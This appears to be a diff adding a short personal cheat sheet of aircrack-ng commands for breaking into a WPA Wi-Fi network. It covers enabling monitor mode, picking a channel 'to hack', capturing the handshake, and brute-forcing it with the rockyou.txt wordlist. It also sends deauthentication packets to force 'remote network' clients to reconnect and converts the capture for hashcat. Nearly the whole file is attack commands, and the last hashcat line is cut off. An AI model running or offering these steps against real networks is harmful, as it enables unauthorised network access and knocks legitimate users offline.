@@ -1,0 +1,26 @@
+airmon-ng check
+airmon-ng check kill
+airmon-ng start wlan0
+iwconfig
+
+//Find Channel to hack
+airodump-ng wlan0mon 
+
+// Get the handshake
+airodump-ng --bssid XX:XX:XX:XX:XX:XX -c channel# --write filename wlan0mon
+
+// Option 1
+
+// Run bruteforce hack against it using a worklist (rockyou.txt)
+aircrack-ng filename.cap -w rockyou.txt
+
+// If needed, force the clients on the remote network to reconnect
+aireplay-ng --deauth 5 -a XX:XX:XX:XX:XX:XX wlan0mon
+
+//Option 2
+//Clean your file
+wpaclean newfilename oldfilename
+
+//Convert file to hccap format to use hashcat
+aircrack-ng filename -J newFilename
+hashcat -m 2500 filenamehasca
